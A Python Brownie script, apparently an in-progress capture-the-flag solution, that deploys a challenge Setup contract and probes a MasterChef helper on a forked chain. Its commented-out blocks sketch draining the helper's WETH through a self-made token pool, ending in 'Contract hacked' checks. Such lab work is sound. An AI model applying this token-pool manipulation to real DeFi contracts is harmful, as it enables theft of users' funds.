from brownie import Setup, WETH9, MasterChefHelper, TestERC20
from brownie import accounts, network, config, chain, interface
from web3 import Web3
import sys

LOCAL_ENVS = ['development', 'ganache', 'mainnet-fork']

get_acc = lambda: accounts[0] if (
    network.show_active() in LOCAL_ENVS
) else accounts.add(config['wallets']['from_key'])

from_me = {'from': get_acc()}


def deploy_infra():
    weth9 = WETH9.deploy({'from': get_acc()})
    setuper = Setup.deploy(
        weth9, {'from': get_acc(), 'value': Web3.toWei(10, 'ether')}
    )
    chain.mine(1)
    chef = MasterChefHelper.at(setuper.mcHelper())
    return weth9, setuper, chef


def main():
    weth9, setuper, chef_helper = deploy_infra()
    #erc20 = TestERC20.deploy(Web3.toWei(1000, 'ether'), {'from': get_acc()})
    weth9.deposit({'from': get_acc(), 'value': Web3.toWei(80, 'ether')})
    router = interface.UniswapV2RouterLike(
        '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F'
    )
    chef = interface.MasterChefLike(
        '0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd'
    )

    weth9.approve(router, weth9.balanceOf(get_acc()), {'from': get_acc()})
    """
    tx = erc20.approve(router, erc20.balanceOf(get_acc()), {'from': get_acc()})
    tx.wait(1)

    tx = router.addLiquidity(
        weth9,
        erc20,
        Web3.toWei(80, 'ether'),
        Web3.toWei(500, 'ether'),
        0, 0, get_acc(), 2661013492,
        {'from': get_acc()}
    )
    tx.wait(1)
    factory = interface.FactoryInterface(
        '0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac'
    )
    lp = factory.getPair(weth9, erc20)
    """ 
    _len = chef.poolLength()
    data = chef.poolInfo.call(_len - 1, {'from': get_acc()})
    print(data)


    """
    print(data)
    lp = interface.UniswapV2PairLike(data[0])

    t0 = lp.token0.call({'from': get_acc()})
    t1 = lp.token1.call({'from': get_acc()})
    print(f'token0: {t0}')
    print(f'expected token0: {weth9}')
    print(f'token1: {t1}')
    print(f'expected token1: {erc20}')
    chain.mine(1)

    erc20.approve(chef_helper, 10 , {'from': get_acc()})
    chef_helper.swapTokenForPoolToken(
        _len - 1, erc20, 10, 0, {'from': get_acc()}
    )
    bal = Web3.fromWei(weth9.balanceOf(chef_helper), 'ether')
    print(f'Helper WETH balance post-hack: {bal}')
    print(f'Contract hacked: {setuper.isSolved()}')
    """



